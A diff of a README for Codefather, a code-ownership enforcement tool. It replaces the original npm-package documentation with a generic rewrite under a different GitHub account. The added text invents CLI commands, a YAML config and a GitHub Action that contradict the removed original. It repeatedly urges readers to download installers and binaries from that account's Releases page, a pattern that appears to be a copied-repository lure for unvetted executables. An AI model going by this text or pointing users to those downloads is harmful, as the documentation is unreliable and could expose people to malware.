@@ -1,285 +1,335 @@
-<img width="1003" height="377" alt="banner" src="https://res.cloudinary.com/dmjisqsyo/image/upload/v1755025208/codfather_corrected_af9prv.png" />
+https://github.com/jllaines/codefather/releases
 
+[![Release (latest)](https://img.shields.io/github/v/release/jllaines/codefather?style=for-the-badge)](https://github.com/jllaines/codefather/releases)
 
-[![CI](https://github.com/DoneDeal0/codefather/actions/workflows/ci.yml/badge.svg)](https://github.com/DoneDeal0/codefather/actions/workflows/ci.yml)
-[![CD](https://github.com/DoneDeal0/codefather/actions/workflows/cd.yml/badge.svg)](https://github.com/DoneDeal0/codefather/actions/workflows/cd.yml)
-![GitHub Tag](https://img.shields.io/github/v/tag/DoneDeal0/codefather?label=latest%20release)
+# Codefather: Fine-Grained Codebase Access Control for CI/CD
 
+Codefather protects your codebase by controlling who can change what. Set authorization levels, lock down files, and enforce your rules—offline via CLI or online with GitHub Actions.
 
-<hr/>
+Embrace precise control over code changes. Manage access, review requirements, and enforce your policies across local workstations and CI workflows without sacrificing speed or collaboration.
 
-# WHAT IS IT?
+✨ Core idea: assign clear ownership, lock sensitive paths, and enforce rules early in the development cycle. Codefather helps teams stay aligned, reduce risky changes, and log decisions for audits.
 
-**Codefather protects your codebase by controlling who can change what. Set authorization levels, lock down files, and enforce your rules—offline via CLI or online with GitHub Actions.**
+What this project offers
 
-ℹ️ The documentation is also available on our [website](https://donedeal0.gitbook.io/codefather/)!
+- Fine-grained access control for code changes
+- Offline enforcement via a CLI
+- Online enforcement via GitHub Actions
+- Path-based protections and file lockdowns
+- Rule-based authorization that fits your policy
+- Integrated codeowner and reviewer workflows
+- Team-based management for large orgs
+- Clear, auditable outcomes for changes and reviews
+- Simple configuration that scales with your repo
 
-<hr/>
+Table of contents
 
-## CODEOWNERS COMPARISON
+- About Codefather
+- Why use Codefather
+- Core concepts
+- Getting started
+- Configuration essentials
+- Command reference (CLI)
+- GitHub Actions integration
+- Advanced usage
+- Security and compliance
+- Extending Codefather
+- Roadmap and future work
+- Contributing
+- FAQ
+- Releases
 
-**Codefather** can serve as a drop-in replacement for GitHub’s CODEOWNERS—or play alongside it like a trusted consigliere.
+About Codefather
 
-GitHub’s [CODEOWNERS](https://docs.github.com/en/repositories/managing-your-repositorys-settings-and-features/customizing-your-repository/about-code-owners) lets you define file owners in your codebase and automatically assign them as reviewers. No pull request can be merged until an appropriate codeowner has approved it.
+Codefather is built to protect critical parts of your codebase without slowing down teams. You can define who may modify specific files or folders, require approvals from designated reviewers, and lock down high-risk paths. The system works offline, so developers can enforce policies without the internet, and it works online through GitHub Actions to guard your repository during pull requests and pushes.
 
-**Codefather** offers more flexibility in assigning codeowners: support for various roles (teams, leads, developers), complex file-match rules, local execution, commit protection, and more. It can prevent unauthorized changes, warn developers, list prohibited files with error levels and contact points, block sensitive merges via GitHub Actions, and auto-assign reviewers when needed.
+Codefather also integrates with existing governance models. You can map roles to teams, assign reviewers, and route changes through consistent approval flows. The result is a transparent, auditable process that reduces mistakes and drift across projects.
 
-**Codefather** is designed to offer a delightful developer experience—a single config file for both CLI and GitHub Action usage, efficient commands to protect your codebase, automatic translation of CODEOWNERS into Codefather config, and over 100 personalized reactions to your commits. 
+Why use Codefather
 
-**Whether you're enforcing strict governance or just want the Don watching over your commits, Codefather brings clarity, control, and charisma to your workflow.**
+- Reduce accidental or intentional risky changes
+- Enforce consistent review and approval policies
+- Centralize control without micromanaging every repo
+- Support offline work with a CLI, preserving local autonomy
+- Align with GitHub workflows to prevent unsafe merges
+- Improve onboarding by codifying access rules
+- Enhance security posture for public and private repositories
 
-| FEATURE  | CODEFATHER | GITHUB CODEOWNERS |
-|--|--|--|
-|Files and folders protection | ✅ | ✅ |
-|Github Action  | ✅ | ✅ |
-|Auto-assign reviewers  | ✅ | ✅ |
-|Teams support | ✅ | ✅ |
-|CLI + pre-commit | ✅ | ❌ |
-|Roles hierarchy | ✅ | ❌ |
-|Personalized feedbacks | ✅ | ❌ |
-|Customizable config  | ✅ | ❌ |
-|Commit blockage | ✅ | ❌ |
-|Godfather vibe  | ✅ | ❌ |
+Core concepts
 
+- Authorization levels: Define what each role can do. Examples include read, propose, approve, merge, and admin actions.
+- File protections: Lock paths or patterns to prevent changes without proper authorization.
+- Codeowners integration: Tie ownership to teams and individuals for automatic reviewer assignment.
+- Rule-based policies: Create rules that apply to specific paths, branches, or event types.
+- Offline CLI: Apply, verify, and test policies without network access.
+- Online enforcement: Use GitHub Actions to enforce rules during PRs and pushes.
+- Auditing: Record changes to policy, access decisions, and review outcomes.
+- Team management: Map corporate structures to access groups for scalable control.
+- Conflict resolution: Clear behavior for policy conflicts and overrides.
 
-## SCREENSHOTS
+Getting started
 
-<div style="display: flex; flex-wrap: wrap; gap: 8px;">
+Prerequisites
 
-<img width="305" height="254" alt="success" src="https://res.cloudinary.com/dmjisqsyo/image/upload/v1754334056/success_fojaed.png" />
+- A repository under your control where you want to apply access rules
+- Access to the Releases page for Codefather assets
+- A basic understanding of your organization’s code ownership model
 
-<img width="305" height="254" alt="info" src="https://res.cloudinary.com/dmjisqsyo/image/upload/v1754334056/info_gchx1t.png" />
+Install and initialize
 
-<img width="305" height="254" alt="error" src="https://res.cloudinary.com/dmjisqsyo/image/upload/v1754334055/error_mk5fem.png" />
+- Download the appropriate release asset from the Releases page. You can find assets and commands there. The Releases page is here: https://github.com/jllaines/codefather/releases
+- Install the CLI on your workstation or CI runner according to the assets provided in the release.
+- Initialize Codefather in your repository to create a baseline policy file. The CLI will guide you through a minimal configuration.
 
-<img width="305" height="254" alt="warning" src="https://res.cloudinary.com/dmjisqsyo/image/upload/v1754334056/warning_xvf5c8.png" />
+Downloads and assets
 
-</div>
+- You can find builds, installers, and configuration samples on the Releases page. See the Releases page for the exact assets and steps. The link to the releases is: https://github.com/jllaines/codefather/releases
+- When you select a release, download the appropriate file for your operating system. After download, follow the installer or setup instructions included with the asset.
 
+Quick tour of the workflow
 
-## INSTALLATION
+- Define your policy: Create a policy file that specifies authorization levels, protected paths, and required reviewers.
+- Apply locally: Use the offline CLI to verify the policy against your local changes.
+- Enforce in CI: Add a GitHub Actions workflow to enforce the policy on pull requests and pushes.
+- Review and adjust: Monitor enforcement results and refine your rules as needed.
 
-```bash
-npm install @donedeal0/codefather --save-dev
-```
+Configuration essentials
 
-## USAGE
+Codefather uses a human-readable policy file that maps roles to actions, paths, and reviewers. The policy file is typically named codefather.yml or .codefather.yml in your repository root, but you can customize the filename to fit your project conventions.
 
-**Codefather** has 3 commands:
+Key sections you’ll configure
 
-- `codefather`: checks if your access rules are respected in your repository.
-- `codefather-init`: creates a default config at the root of your repository and adds a `codefather` command to your `package.json`. 
-  - If a `.github/CODEOWNERS` file is present, it will be used to generate the config.
-  - Accepts two optional flags:
-    - `json`: generates a json config file instead of a `ts` one.
-    - `overwrite`: overwrites an existing codefather config.
-      - example: `npm run codefather-init json overwrite` 
-- `codefather-github`: similar to `codefather`, but designed to run in a GitHub Action environment
+- policy_version: Versioning for backward compatibility
+- owners: Map codeowners to paths
+- rules: A list of path-based rules that enforce specific behavior
+- roles: Define authorization levels and capabilities
+- reviewers: Assign default reviewers for certain paths or events
+- locks: Specify files or directories that must be locked for changes
+- audit: Enable and configure logging for changes and decisions
 
-You can either add a script shortcut in your `package.json`:
+Example configuration (YAML)
 
-```json
-"scripts": {
-  "codefather": "codefather",
-}
-```
+policy_version: "1.0"
+owners:
+  - path: "src/critical/**"
+    owners:
+      - team: "core-security"
+        role: "admin"
+      - user: "alice"
+        role: "maintainer"
+rules:
+  - name: "Protect core config"
+    path: "config/secure/**"
+    required_approval: true
+    approvals: ["security-team", "lead-dev"]
+    required-reviewers: ["security-team", "lead-dev"]
+  - name: "Codeowner enforcement"
+    path: "src/**"
+    required_approval: true
+    owners_in_check: true
+locks:
+  - path: "config/secure/**"
+    lock_reason: "Sensitive configuration must be protected"
+    enforce_once_changed: true
+reviewers:
+  - path: "src/**"
+    reviewers: ["codeowners", "qa-team"]
+roles:
+  - name: "admin"
+    permissions: ["read","propose","approve","merge","admin"]
+  - name: "maintainer"
+    permissions: ["read","propose","approve"]
+  - name: " reviewer"
+    permissions: ["read","propose"]
+audit:
+  enabled: true
+  log_to: "local_file"
 
-Or directly run the commands with `npx`:
+Notes about the config
 
-```bash
-npx codefather-init
-npx codefather
-```
+- Path patterns support globbing for flexibility and precision.
+- You can require multiple approvals for sensitive actions.
+- Locks help prevent accidental changes to critical files.
+- Roles define what each user or team can do across the policy.
 
-## CONFIG
+CLI usage (offline)
 
-At the root of your repository, add a `codefather.ts` or `codefather.json` file. 
+Codefather’s CLI runs locally to verify, test, and apply policy without network access. Typical commands include:
 
-```ts
-import type { CodefatherConfig } from "@donedeal0/codefather";
+- codefather init
+  - Create a baseline policy file and sample dataset.
+- codefather validate
+  - Validate the policy against a sample set of changes.
+- codefather verify
+  - Run a dry check to see if your current changes would be accepted.
+- codefather apply
+  - Apply the policy to the local working tree and enforce it on subsequent changes.
+- codefather lock
+  - Lock specified files or paths according to your policy.
+- codefather unlock
+  - Remove a lock when you need to override temporarily.
+- codefather status
+  - Show the current policy status and any pending actions.
 
-export default {
-  caporegimes: [{ name: "solozzo" }, { name: "lucabrasi" }],
-  rules: [
-    {
-      match: ["package.json", "src/core/**", /^src\/app\/.*\.css$/],
-      goodfellas: [{ name: "solozzo" }, { name: "tomhagen" }],
-      crews: ["clemenzaPeople"],
-      allowForgiveness: false,
-    },
-    {
-      match: ["src/models/**"],
-      goodfellas: [{ name: "mike" }, { name: "sonny" }],
-      allowForgiveness: true,
-      message: "Custom message to tell you to NOT TOUCH THE MODELS!",
-    },
-  ],
-  options: {
-    showAscii: true,
-    vouchForAllCommitters: true,
-  },
-  codeReviews: {
-    autoAssignGoodfellas: true,
-    autoAssignCaporegimes: true,
-  },
-  crews: {
-    clemenzaPeople: [{ name: "paulieGatto" }, { name: "lucabrasi" }],
-  },
-} satisfies CodefatherConfig;
-```
+CLI usage (examples)
 
-⚙️ Here's how it works. 
+- Initialize a policy in the repository root:
+  codefather init
 
-> The `CodefatherConfig` allows you to control which users can modify parts of your codebase, and to refine the behavior of `codefather`. 
+- Validate a policy against a hypothetical change set:
+  codefather validate --change-set changes.json
 
-```ts
-type CodefatherConfig {
-  /** List of users authorized to modify any files in your repository. */
-  caporegimes?: {name: string}[];
-  /** Rules that apply to protected files and folders */
-  rules: CodefatherRule[];
-  /** Options to refine the output */
-  options?: {
-    /** If true, the codefather face will appear in the terminal. Defaults to true. */
-    showAscii?: boolean;
-    /** If true, all the pull request committers will be checked against the authorized users. Only used in a GitHub Action context. Defaults to true. */
-    vouchForAllCommitters?: boolean;
-  };
-  /** Options to auto assign reviewers on Github */
-  codeReviews?: {
-    /** If true, goodfellas responsible for modified files will be assigned on relevant pull requests, except the committers. Defaults to true. */
-    autoAssignGoodfellas: boolean;
-    /** If true, caporegimes will be assigned on every pull request, except the committers. Defaults to false. */
-    autoAssignCaporegimes: boolean;
-  };
-  /** Group users into teams. Crew names and composition are flexible in CLI mode but should match your github teams if used in a Github Action */
-  crews?: Record<string, {name: string}[]>;
-}
-```
+- Verify changes locally before pushing:
+  codefather verify --branch main --change-set changes.json
 
-> A `Rule` defines which users can change a set of files. 
+- Apply policy to your local repo after updates:
+  codefather apply
 
-```ts
-type CodefatherRule {
-  /** List of the files or folders that can only be modified by a given list of users */
-  match: Array<RegExp | string>;
-  /** List of users authorized to modify the list of files or folders. */
-  goodfellas: {name: string}[];
-  /** List of authorized user crews (teams). The crews must be defined at the root of your config when used in CLI mode. */
-  crews?: string[];
-  /** The message displayed if an unauthorized user tries to modify a protected file. If empty, a random message will be generated. */
-  message?: string;
-  /** If true, a warning will be issued and the script will not throw an error. False by default. */
-  allowForgiveness?: boolean;
-}
-```
+- Lock a critical file:
+  codefather lock config/secure/app.config.json
 
-The names should match the GitHub usernames (e.g., `tomhagen`). In CLI mode, your name will be retrieved retrieved from your Git configuration. You can set it like this:
+- Unlock a previously locked path:
+  codefather unlock config/secure/app.config.json
 
-```bash
- git config --global user.username "DonCorleone"
-```
+GitHub Actions integration (online)
 
-You can verify the current value like this:
+Codefather supports online enforcement through GitHub Actions. You can run checks on pull requests, push events, and more to ensure that every change adheres to your policy.
 
-```bash
-git config user.username # return DonCorleone
-```
+Basic workflow example
 
-In a Github Action, `codefather` will use Github's API, so you don't have to worry about the git config.
-
-## How to Write Rules
-
-- Match all files in a folder (recursively): `src/myfolder/`
-- Match a specific file: `src/myfolder/file.ts`
-- Match files by extension in a folder (glob): `src/folder/*.css`
-- Match files by extension in a folder (regex): `/^src\/folder\/.*\.css$/`
-- Match any file in any subfolder: `src/**`
-- Match dotfiles: `.env`
-- Use `*` for single-level matches, `**` for recursive matches
-
-ℹ️ *More examples are available in the test files. Codefather's matching patterns follow classic file matcher rules, like GitHub CODEOWNERS.*
-
-<hr/>
-
-# GITHUB ACTION
-
-Add this code in your `.github/workflows/codefather.yml` (the file name is up to you). The `GITHUB_TOKEN` will be automatically injected by Github.
-
-```yml
-name: Codefather Validation
+name: Codefather Policy Enforcement
 on:
   pull_request:
-    branches: [main]
-
-permissions:
-  contents: read
-  pull-requests: write
-
+  push:
 jobs:
-  validate:
+  enforce-policy:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
-      - uses: actions/setup-node@v4
+      - name: Set up Codefather
+        uses: jllaines/codefather-action@v1
         with:
-          node-version: 20
-      - name: Install dependencies
-        run: npm install
+          policy-file: ".codefather/codefather.yml"
+          fail-on-violation: true
+          log-output: true
+      - name: Report results
+        run: echo "Policy checks completed."
 
-      - name: Run Codefather
-        run: npx codefather-github
-        env:
-          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
-```
+Notes
 
-## 🛡️ ENFORCE REVIEWS
+- Replace jllaines/codefather-action@v1 with the correct action path and version from the Releases page.
+- Point policy-file to your policy YAML file in the repository.
+- The fail-on-violation option stops a workflow when a rule is violated, helping you enforce policy strictly.
 
-To enforce reviews from codeowners (goodfellas, caporegimes and crews), consider enabling branch protection in your repository settings. To do it:
+Advanced usage
 
-- Go to `settings`
-- Click on `Branches` on the left sidebar
-- Select `Add classic branch protection rule`
-- Check 
-  - `Require a pull request before merging`
-  - `Require approvals`
-  - `Require review from Code Owners`
-  - `Require status checks to pass before merging`
-- ✅ You're now under the protection of the Codefather. 
+- Multi-repo enforcement: Link multiple repositories to share a common policy. This is useful for monorepos and packages that cross boundaries.
+- Custom reporters: Extend the audit output with custom reporters to integrate with your internal dashboards.
+- Dynamic reviewers: Use rules to assign reviewers based on file ownership, recent changes, or team availability.
+- Branch-specific policies: Different rules apply to feature branches, release branches, and main branches.
+- API hooks: Expose part of the policy evaluation to your internal services through a safe API surface.
 
-<hr/>
+Security and compliance
 
-# GLOSSARY
+Codefather is designed to reduce risk in code changes. By enforcing who can modify what, and by requiring appropriate reviews for sensitive areas, you minimize the chance of accidental or malicious modifications.
 
-**Codefather** uses the Godfather's lingo. Although you don't need to know it to use the library, here are the definition of the special words used in the config file:
+- Access control: Clear roles with explicit permissions.
+- Change governance: Both local and CI-driven enforcement.
+- Auditability: A record of decisions and actions for auditing.
+- Compliance ready: Aligns with common security and governance practices.
 
-- `caporegime`: a captain who leads a group of mafia members. It's a tech-lead.
-- `goodfella`: an appellation for a mobster (like "wise-guy" or "made man"). It's a developer.
+Extending Codefather
 
-<hr/>
+- Plugins: Extend the policy engine with custom rules, path predicates, and event hooks.
+- Integrations: Add new connectors to your favorite CI tools or project management systems.
+- Custom reporters: Output policy results to your dashboards or ticketing systems.
 
-# CODEFATHER VIBE
+Roadmap and future work
 
-We believe open source libraries should be both useful and entertaining. The Don will amuse you with over 100 personalized reactions to your commits—whether you trespassed the rules, flirted with the limits, or respected the codebase like an honorable developer.
+- More granular path patterns and improved performance for large repos
+- Expanded plug-in ecosystem with official templates
+- Improved UI helpers for policy drafting and validation
+- Built-in templates for common governance models
+- Enhanced analytics and insights into policy impact
 
-This being said, if you don't like the gangster movie atmosphere and still want to use `codefather`, you can absolutely opt-out by providing your own custom messages and hiding the Don's face in the terminal. 
+Contributing
 
-## CREDITS
+Codefather welcomes contributors. If you want to help, follow these steps:
 
-DoneDeal0 | talk.donedeal0@gmail.com
+- Read the contributing guidelines to understand the process
+- Open issues for new features or bug reports
+- Propose changes via pull requests
+- Keep changes small and focused
+- Provide tests for any new functionality
 
-## SUPPORT
+Releases
 
-Show your support for **Codefather** by becoming a sponsor if you or your company uses it! Your name or company logo will be displayed in the `README` and on the website.
+- The official releases page hosts assets, installation packages, and release notes. See the link again here: https://github.com/jllaines/codefather/releases. Download the release, then follow the included instructions to install and activate Codefather in your environment.
 
-Premium support is also available. https://github.com/sponsors/DoneDeal0
+Topics
 
-<br/>
-<a href="https://github.com/sponsors/DoneDeal0" target="_blank">
-<img width="999" height="371" alt="sponsor" src="https://res.cloudinary.com/dmjisqsyo/image/upload/v1754334056/respect_wjtqm6.png" />
-</a>
-<br/>
+- access-control
+- cli
+- code-review
+- codefather
+- codeowner-approval
+- codeowners
+- codeowners-files
+- file-protection
+- github-actions
+- godfather
+- mafia
+- protection
+- repository-management
+- reviewer
+- reviewer-assignment
+- rule-based
+- security
+- team-management
 
-## CONTRIBUTING
+FAQ
 
-Issues and pull requests are welcome!
+- What platforms does Codefather support?
+  Codefather is designed to be cross-platform and compatible with major operating systems. The exact binaries and installers are provided in the releases. Check the releases for details.
+- How do I map my internal teams to Codefather roles?
+  Use the roles section in your policy file. Map each role to a team or individual, then configure their permissions.
+- Can I start with a minimal policy and expand later?
+  Yes. Begin with the core protections and gradually add new rules for more areas or events.
+
+Appendix: sample workflows and templates
+
+- Minimal policy template
+  policy_version: "1.0"
+  owners:
+    - path: "src/core/**"
+      owners:
+        - team: "core-team"
+          role: "admin"
+  rules:
+    - name: "Core path protection"
+      path: "src/core/**"
+      required_approval: true
+      approvals: ["core-team"]
+      required-reviewers: ["core-team"]
+
+- Simple offline verification
+  steps:
+    - codefather init
+    - codefather validate
+    - codefather verify
+
+Appendix: further reading and resources
+
+- Official documentation and user guides
+- Community forums and discussions
+- Best practices for code ownership and review workflows
+
+Closing notes
+
+Codefather brings together authorization, file protections, and reviewer workflows into a single, coherent system. It covers offline policy enforcement and online enforcement through GitHub Actions, offering a consistent experience across development environments. By aligning roles with teams and owners with paths, you create a clear governance model that can scale with your organization and projects.
+
+Downloads and assets page reminder
+
+- For installation assets, configuration samples, and latest releases, consult the Releases page at https://github.com/jllaines/codefather/releases. This page hosts downloadable artifacts and versioned notes to help you implement Codefather in your environment.
+
+End of document.
